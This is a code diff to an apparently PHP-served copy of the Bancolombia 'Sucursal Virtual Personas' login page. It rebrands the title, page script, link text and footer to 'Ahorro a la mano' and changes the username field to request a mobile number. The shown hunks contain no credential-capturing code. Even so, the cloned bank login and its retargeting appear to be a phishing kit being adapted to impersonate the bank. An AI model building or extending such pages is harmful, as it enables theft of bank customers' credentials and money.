@@ -88,7 +88,7 @@ function validarRespuesta($respuesta)
 <html>
 
 <head>
-    <title>Bancolombia Sucursal Virtual Personas</title>
+    <title>Ahorro a la mano Sucursal Virtual Personas</title>
     <meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
     <meta charset="ISO-8859-1" />
     <meta content="es" http-equiv="Content-Language" />
@@ -1092,7 +1092,7 @@ getSecs();
 </script>
 <script type="text/javascript">
 function setTitle() {
-    document.title = "Bancolombia Sucursal Virtual Personas";
+    document.title = "Ahorro a la mano Sucursal Virtual";
 }
 </script>
 
@@ -1207,11 +1207,11 @@ function setTitle() {
                                                     </div>
                                                 </div>
                                                 <label class="control-label-index" for="username">Ingresa tu
-                                                    usuario</label>
+                                                    número de cel</label>
                                             </div>
                                             <div>
                                                 <div class="mua_svp_enroll_update_control">
-                                                    <input id="username" name="username" tabindex="1"
+                                                    <input type="number" id="username" name="username" tabindex="1"
                                                         class="mua-form-control mua_svp_control_username mua-input-icon"
                                                         onkeypress="checkKey(event)"
                                                         onchange="trim(document.loginUserForm.username)" type="text"
@@ -1255,7 +1255,7 @@ function setTitle() {
                                                     </span>
                                                 </div>
                                                 <div class="mua-divCell-text">
-                                                    Conoce sobre Sucursal Virtual Personas
+                                                    Conoce sobre Sucursal Ahorro a la mano
                                                 </div>
                                             </a>
                                         </div>
@@ -1711,7 +1711,7 @@ function setTitle() {
             <div class="row">
                 <div class="col-xs-12 col-sm-12 col-md-12">
                     <p class="mua-footer">
-                        Sucursal Telef&oacute;nica Bancolombia: Bogot&aacute; (57) 60 1
+                        Sucursal Telef&oacute;nica Ahorro a la mano: Bogot&aacute; (57) 60 1
                         343 00 00 - Medell&iacute;n (57) 60 4 510 90 00 - Cali (57) 60 2
                         554 05 05 - Barranquilla (57) 60 5 361 88 88 - Cartagena (57) 60
                         5 693 44 00 - <br />
